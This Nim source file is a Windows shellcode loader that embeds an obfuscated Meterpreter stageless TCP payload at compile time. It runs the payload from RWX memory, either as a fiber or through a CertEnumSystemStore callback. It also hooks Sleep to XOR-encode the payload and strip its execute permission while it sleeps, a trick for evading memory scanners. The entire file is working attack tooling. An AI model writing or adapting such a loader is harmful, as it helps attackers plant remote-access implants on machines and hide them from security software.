import minhook
import ptr_math
import winim\lean
import nimprotect

# Shellcode execution method
# 1 = as Fiber
# 2 = CertEnumSystemStore callback
let execMethod = 1

var shellcAddress: LPVOID
var shellcSize: SIZE_T

func toBytes(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))


proc injectShellcode(shellc: seq[byte], execMethod: int): bool = 

    shellcSize = shellc.len

    # Allocate memory
    shellcAddress = VirtualAlloc(
        NULL,
        shellcSize,
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    # Copy shellcode
    CopyMemory(
        shellcAddress,
        cast[PVOID](unsafeAddr shellc[0]),
        shellcSize,
    )
    
    if execMethod == 1: # Execute as Fiber
        discard ConvertThreadToFiber(NULL)
        let shellcodeFiber = CreateFiber(shellcSize, cast[LPFIBER_START_ROUTINE](shellcAddress), NULL)
        SwitchToFiber(shellcodeFiber)

    elif execMethod == 2: # Execute as Callback
        CertEnumSystemStore(
        CERT_SYSTEM_STORE_CURRENT_USER,
        nil,
        nil,
        cast[PFN_CERT_ENUM_SYSTEM_STORE](shellcAddress)
        )
    else:
        return false


proc xorMemory(address: LPVOID, size: SIZE_T, key: byte) =
    for i in 0..<int(size):
        cast[PBYTE](address + i)[0] = cast[PBYTE](address + i)[0] xor key


proc mySleep(dwMilliseconds: DWORD) {.stdcall, minhook: Sleep.} =
    
    var oldProtection : DWORD
    
    # Revoke X permission
    VirtualProtect(shellcAddress, shellcSize, PAGE_READWRITE, addr oldProtection)
    
    # Encode the shellcode
    xorMemory(shellcAddress, shellcSize, 0x1)
    
    # Sleep for real
    SleepEx(dwMilliseconds, FALSE)

    # Decode the shellcode
    xorMemory(shellcAddress, shellcSize, 0x1)

    # Add X permission
    VirtualProtect(shellcAddress, shellcSize, PAGE_EXECUTE_READWRITE, addr oldProtection)



when isMainModule:
    
    # Read shellcode at compile time
    const shellcode = staticRead(protectString("x64_meterpreter_stageless_tcp_donut"))

    # Enable kernel32:Sleep hook
    enableHook(Sleep) 

    # Jump to shellcode
    discard injectShellcode(toBytes(shellcode), execMethod)
    
    

